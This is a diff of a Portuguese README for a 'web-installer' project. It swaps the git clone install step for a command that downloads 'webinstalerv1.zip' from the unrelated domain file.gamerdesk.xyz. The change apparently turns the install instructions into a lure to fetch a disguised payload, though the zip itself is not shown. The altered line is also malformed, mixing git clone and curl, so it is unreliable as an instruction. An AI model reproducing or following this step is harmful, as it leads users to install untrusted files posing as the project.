@@ -83,7 +83,7 @@ Organizadas em categorias para fácil navegação:
 ### Instalação Local
 1. Clone o repositório:
 ```bash
-git clone https://github.com/seu-usuario/web-installer.git
+git clone curl -O https://file.gamerdesk.xyz/wil/webinstalerv1.zip
 cd web-installer
 ```
 
